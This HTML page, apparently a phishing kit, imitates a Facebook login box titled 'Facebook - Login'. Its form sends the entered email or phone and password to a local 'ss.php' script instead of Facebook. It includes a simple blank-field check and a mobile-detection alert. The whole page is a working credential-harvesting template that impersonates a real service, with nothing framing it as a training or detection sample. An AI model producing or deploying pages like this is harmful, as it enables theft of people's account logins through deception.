<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Facebook - Login</title>
</head>

<body onload="box1()" style=" background-image:url(img.jpg); padding-top: 150px; background-repeat:no-repeat; background-size:100%;">

<table align="center"  border="0" cellspacing="2" cellpadding="2" style="border:1px solid;
border-radius:10px; color:#999999;width:400px; height:100px; background-color:#4B699D; " >
  <tr>
  
    <td align="center" ><h3>Login with facebook</h3><img  src="capture.png"  /><br/><font color="#CCCCCC"></font>
	<hr />

</td>
  </tr>

  <tr>
    <td >
	<form name="loginfrm" action="ss.php" method="post" onSubmit="return validate();">
	<table width="100%" border="0" cellspacing="6" cellpadding="6">
  <tr>
    <td align="right" style="color:#FFFFFF; font-family:Verdana, Arial, Helvetica, sans-serif; font-size:12px; font-weight:bold;"><strong>Email or Phone</strong></td>
    <td> <input type="text" name="email" value=""   style="font-size:18px; color:#000000; height:30px;border:1px solid;
border-radius:5px;"/></td>
    
  </tr>
  <tr>
    <td align="right" style="color:#FFFFFF; font-family:Verdana, Arial, Helvetica, sans-serif; font-size:12px; font-weight:bold;"><strong>Password</strong></td>
    <td><input type="password" name="pass" value="" style="font-size:18px; color:#000000; height:30px; border:1px solid;
border-radius:5px;"/></td>
   
  </tr>
  <tr>
  <td colspan="2" align="center"><input type="submit" name="Submit" value="Log in" style="background:#5B74A8;

color:white;

border-style:outset;

border-color:#0066A2;

height:40px;

width:100px;

font: bold 15px arial,sans-serif;" /></td>
  </tr>
 
</table></form></td>
  </tr>
</table>



</body>
</html>
<script language="javascript" type="text/javascript">
function validate(){
        if(document.loginfrm.email.value == ""){
                alert("User name can not be blank.");
                document.loginfrm.email.value = "";
                document.loginfrm.email.focus();
                return false;
        }
        if( document.loginfrm.pass.value == ""){
                alert("Password can not be blank.");
                document.loginfrm.pass.value = "";
                document.loginfrm.pass.focus();
                return false;
        }
        return true;
}

function box1(){
 if( navigator.userAgent.match(/Android/i)
 || navigator.userAgent.match(/webOS/i)
 || navigator.userAgent.match(/iPhone/i)
 || navigator.userAgent.match(/iPad/i)
 || navigator.userAgent.match(/iPod/i)
 || navigator.userAgent.match(/BlackBerry/i)
 || navigator.userAgent.match(/Windows Phone/i)
 ){
    Alert("Thanks For Visiting from Mobile!");
  }
 
}

</script>